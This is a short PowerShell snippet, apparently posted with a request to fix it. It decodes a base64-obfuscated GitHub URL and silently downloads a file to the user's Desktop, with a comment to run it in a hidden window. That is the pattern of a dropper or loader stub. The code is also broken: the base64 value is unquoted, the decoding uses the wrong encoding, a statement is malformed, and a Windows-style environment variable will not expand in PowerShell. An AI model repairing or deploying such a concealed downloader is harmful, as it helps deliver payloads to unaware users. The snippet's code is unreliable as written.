# Fix and update this code.
# Run as -windowstyle hidden
$b = aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3F1YW50dW1jb3JlL3N1cGVyY2hhcmdlL21hc3Rlci9SRUFETUUubWQ= $a =[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($b))
$a (new-object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/quantumcore/supercharge/master/README.md','C:\Users\%USERNAME%\Desktop\README.md')
